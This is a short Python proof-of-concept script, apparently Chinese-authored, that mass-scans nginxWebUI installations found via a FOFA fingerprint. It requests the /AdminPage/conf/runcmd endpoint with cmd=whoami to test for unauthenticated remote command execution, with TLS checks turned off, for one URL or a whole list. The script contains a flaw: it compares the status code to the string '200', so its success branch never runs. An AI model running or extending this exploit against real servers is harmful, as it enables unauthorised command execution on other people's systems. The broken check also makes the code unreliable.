import requests
import sys

print('+------------------------------------------')
print('+ \033[36m使用格式: python3 NginxwebUI.py -u https://x.x.x.x \033[0m')
print('+ \033[36m使用格式: python3 NginxwebUI.py -f xxx.txt \033[0m')
print('+ \033[36m指纹特征: fofa: app="nginxWebUI" \033[0m')
print('+ \033[36mauther >>> Lsec \033[0m')
print('+------------------------------------------')

payload = "/AdminPage/conf/runcmd?cmd=whoami"


def url_poc(url):
    domain = url + payload
    requests.packages.urllib3.disable_warnings()
    resp = requests.get(domain,verify=False)
    if resp.status_code == '200':
        print(url+"存在漏洞")
        print(resp.text)

def list_url_poc(urls):
    with open(urls, "r") as f:
        for url in f.readlines():
            domain = (url.strip() + payload)
            requests.packages.urllib3.disable_warnings()
            resp = requests.get(domain, verify=False)
            if resp.status_code == '200':
                print(url + "存在漏洞")
                print(resp.text)

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Usage: python NginxwebUI.py -u <url>")
        print("Usage: python NginxwebUI.py -f <url>")
        sys.exit(1)

    if sys.argv[1] == "-u":
        url = sys.argv[2]
        url_poc(url)
    elif sys.argv[1] == "-f":
        urls = sys.argv[2]
        list_url_poc(urls)
